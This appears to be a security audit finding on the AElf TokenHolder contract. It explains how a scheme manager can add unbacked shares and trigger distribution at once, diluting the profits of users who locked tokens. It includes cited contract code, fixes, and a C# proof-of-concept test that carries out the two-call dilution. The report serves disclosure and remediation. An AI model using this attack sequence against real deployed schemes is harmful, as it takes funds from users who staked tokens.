# Audit Report

## Title
Scheme Manager Can Dilute User Profits by Adding Phantom Shares Without Token Locking

## Summary
The TokenHolder contract allows scheme managers to add beneficiaries with arbitrary shares without requiring token locking, while regular users must lock tokens to receive shares. This asymmetry enables managers to dilute legitimate users' profits by adding unbacked phantom shares immediately before distribution, resulting in direct fund theft.

## Finding Description

The TokenHolder contract provides two fundamentally different paths for becoming a profit beneficiary:

**Regular User Path (RegisterForProfits):** Users must lock tokens to participate. The function enforces token locking via `TokenContract.Lock` and creates a 1:1 correspondence between locked tokens and profit shares. [1](#0-0) 

**Manager Path (AddBeneficiary):** The scheme manager can directly add any beneficiary with arbitrary shares without any token locking requirement. The only check is that the caller must be the scheme manager, verified via `GetValidScheme(Context.Sender)`. [2](#0-1) 

The underlying Profit contract authorization allows both the scheme manager and TokenHolder contract to add beneficiaries, but performs no validation of economic backing for shares. [3](#0-2) 

When profits are distributed, all shares are treated equally using proportional allocation via `SafeCalculateProfits`, which calculates `(totalAmount * shares / totalShares)` with no distinction between shares backed by locked tokens and unbacked phantom shares. [4](#0-3) 

**Critical Timing Vulnerability:** When TokenHolder schemes are created via `CreateScheme`, the contract does not set `DelayDistributePeriodCount` in the `CreateSchemeInput`, causing it to default to 0. [5](#0-4) 

In `ProfitContract.AddBeneficiary`, the beneficiary's `StartPeriod` is set as `scheme.CurrentPeriod.Add(scheme.DelayDistributePeriodCount)`. With `DelayDistributePeriodCount = 0`, newly added shares can participate in the current period's distribution immediately. [6](#0-5) 

The manager has exclusive control over distribution timing, as `DistributeProfits` can only be called by the scheme manager or the TokenContract. [7](#0-6) 

## Impact Explanation

This vulnerability enables direct theft of user funds through profit dilution. When legitimate users lock tokens to receive profit shares, a malicious manager can add themselves as a beneficiary with massive unbacked shares, proportionally reducing each user's profit allocation.

**Concrete Attack Scenario:**
- User A locks 1,000 tokens → receives 1,000 shares
- 10,000 tokens contributed as profits to the scheme
- Manager calls `AddBeneficiary` adding themselves with 9,000 phantom shares (no tokens locked)
- Manager immediately calls `DistributeProfits`
- Total shares: 10,000 (1,000 legitimate + 9,000 phantom)
- User A receives: (1,000/10,000) × 10,000 = 1,000 tokens (expected 10,000)
- Manager receives: (9,000/10,000) × 10,000 = 9,000 tokens (with zero economic contribution)

The attack scales with profit amounts and can completely drain user profit entitlements. Anyone can create a scheme and become its manager without restrictions, as the manager is simply set to `Context.Sender` during scheme creation. [8](#0-7) 

This violates the fundamental economic invariant that profit shares should correspond to locked economic value, as enforced for regular users via `RegisterForProfits`.

## Likelihood Explanation

The attack has HIGH likelihood due to:

**Low Complexity:** Requires only two transactions: `AddBeneficiary` specifying the manager's address and desired share amount, followed by `DistributeProfits`. No complex state manipulation needed.

**Full Control:** The manager has complete control over both adding beneficiaries and triggering distribution, eliminating any front-running risk or timing constraints. The manager can execute both operations atomically.

**Zero Cost:** No token locking or economic stake required for the attack. The manager risks nothing while gaining proportional profit share.

**Difficult Detection:** Users cannot predict when the manager will add beneficiaries or trigger distribution. The attack is only observable post-execution through reduced profit amounts received.

**Unrestricted Access:** Anyone can create schemes and become manager without restrictions, governance approval, or collateral requirements, meaning this vulnerability is not limited to compromised privileged accounts.

## Recommendation

Implement one of the following fixes:

1. **Enforce Token Locking for All Beneficiaries:** Modify `AddBeneficiary` to require token locking proportional to shares being added, matching the invariant enforced in `RegisterForProfits`.

2. **Set Non-Zero DelayDistributePeriodCount:** Modify `TokenHolderContract.CreateScheme` to set `DelayDistributePeriodCount` to a non-zero value (e.g., 1) in the `CreateSchemeInput`, preventing newly added shares from participating in the current period.

3. **Separate Manager and Beneficiary Roles:** Restrict `AddBeneficiary` to only allow adding beneficiaries who have locked tokens via `RegisterForProfits`, and prevent the manager from being a direct beneficiary.

## Proof of Concept

```csharp
[Fact]
public async Task ManagerCanDiluteUserProfits_WithPhantomShares()
{
    // Setup: Manager creates a scheme
    await TokenHolderContractStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF"
    });
    
    // User locks 1,000 tokens and registers for profits
    var userStub = GetTokenHolderContractTester(UserKeyPairs[0]);
    await GetTokenContractTester(UserKeyPairs[0]).Approve.SendAsync(new ApproveInput
    {
        Spender = TokenHolderContractAddress,
        Symbol = "ELF",
        Amount = 1000
    });
    
    await userStub.RegisterForProfits.SendAsync(new RegisterForProfitsInput
    {
        SchemeManager = Starter,
        Amount = 1000
    });
    
    // Contribute 10,000 tokens as profits
    await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = Starter,
        Symbol = "ELF",
        Amount = 10000
    });
    
    // Manager adds themselves with 9,000 phantom shares (no token locking!)
    await TokenHolderContractStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = Starter, // Manager address
        Shares = 9000
    });
    
    // Manager distributes profits
    await TokenHolderContractStub.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeManager = Starter
    });
    
    // User claims profits - should get 10,000 but only receives 1,000
    var userBalanceBefore = (await GetTokenContractTester(UserKeyPairs[0]).GetBalance.CallAsync(
        new GetBalanceInput { Owner = UserAddresses[0], Symbol = "ELF" })).Balance;
    
    await userStub.ClaimProfits.SendAsync(new ClaimProfitsInput
    {
        SchemeManager = Starter,
        Beneficiary = UserAddresses[0]
    });
    
    var userBalanceAfter = (await GetTokenContractTester(UserKeyPairs[0]).GetBalance.CallAsync(
        new GetBalanceInput { Owner = UserAddresses[0], Symbol = "ELF" })).Balance;
    
    var userProfit = userBalanceAfter - userBalanceBefore;
    
    // User only received 1,000 tokens (10% of 10,000) instead of all 10,000
    userProfit.ShouldBe(1000); // Demonstrates the dilution attack
    
    // Manager can claim 9,000 tokens despite locking zero tokens
    var managerBalanceBefore = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = Starter, Symbol = "ELF" })).Balance;
    
    await TokenHolderContractStub.ClaimProfits.SendAsync(new ClaimProfitsInput
    {
        SchemeManager = Starter,
        Beneficiary = Starter
    });
    
    var managerBalanceAfter = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = Starter, Symbol = "ELF" })).Balance;
    
    var managerProfit = managerBalanceAfter - managerBalanceBefore;
    managerProfit.ShouldBe(9000); // Manager stole 9,000 tokens with phantom shares
}
```

## Notes

This vulnerability represents a fundamental design flaw in the TokenHolder contract's authorization model. The separation between token-backed shares (via `RegisterForProfits`) and unbacked shares (via `AddBeneficiary`) creates an exploitable asymmetry that allows managers to steal user funds through profit dilution. The immediate participation of new shares (due to `DelayDistributePeriodCount = 0`) and manager control over distribution timing make this attack trivially executable with guaranteed success.

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L20-25)
```csharp
        State.ProfitContract.CreateScheme.Send(new CreateSchemeInput
        {
            Manager = Context.Sender,
            IsReleaseAllBalanceEveryTimeByDefault = true,
            CanRemoveBeneficiaryDirectly = true
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L37-68)
```csharp
    public override Empty AddBeneficiary(AddTokenHolderBeneficiaryInput input)
    {
        var scheme = GetValidScheme(Context.Sender);
        var detail = State.ProfitContract.GetProfitDetails.Call(new GetProfitDetailsInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
        var shares = input.Shares;
        if (detail.Details.Any())
        {
            // Only keep one detail.

            State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
            {
                SchemeId = scheme.SchemeId,
                Beneficiary = input.Beneficiary
            });
            shares.Add(detail.Details.Single().Shares);
        }

        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = input.Beneficiary,
                Shares = shares
            }
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L134-135)
```csharp
        Assert(Context.Sender == Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName) ||
               Context.Sender == input.SchemeManager, "No permission to distribute profits.");
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L159-176)
```csharp
        State.TokenContract.Lock.Send(new LockInput
        {
            LockId = lockId,
            Symbol = scheme.Symbol,
            Address = Context.Sender,
            Amount = input.Amount
        });
        State.LockIds[input.SchemeManager][Context.Sender] = lockId;
        State.LockTimestamp[lockId] = Context.CurrentBlockTime;
        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = Context.Sender,
                Shares = input.Amount
            }
        });
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L171-174)
```csharp
        Assert(
            Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager can add beneficiary.");
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L186-192)
```csharp
        var profitDetail = new ProfitDetail
        {
            StartPeriod = scheme.CurrentPeriod.Add(scheme.DelayDistributePeriodCount),
            EndPeriod = input.EndPeriod,
            Shares = input.BeneficiaryShare.Shares,
            Id = input.ProfitDetailId
        };
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L956-962)
```csharp
    private static long SafeCalculateProfits(long totalAmount, long shares, long totalShares)
    {
        var decimalTotalAmount = (decimal)totalAmount;
        var decimalShares = (decimal)shares;
        var decimalTotalShares = (decimal)totalShares;
        return (long)(decimalTotalAmount * decimalShares / decimalTotalShares);
    }
```
